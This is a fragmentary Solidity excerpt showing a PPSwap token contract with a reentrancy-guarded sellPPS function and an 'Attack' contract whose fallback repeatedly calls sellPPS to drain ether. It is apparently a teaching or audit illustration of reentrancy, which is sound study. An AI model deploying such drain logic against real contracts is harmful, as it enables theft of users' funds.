...
contract PPSwap is ERC20Interface, SafeMath {
    ...
    function sellPPS(uint amtPPS) noReentrant() public payable {
...
contract Attack {
    ...
    constructor(address payable _ppswapAddress) {
        ppswap = PPSwap(_ppswapAddress);
    }

    function getMoney() public payable {}

    fallback() external payable {
        if (address(ppswap).balance >= 1 ether) {
            ppswap.sellPPS(1 ether);
        }
    }
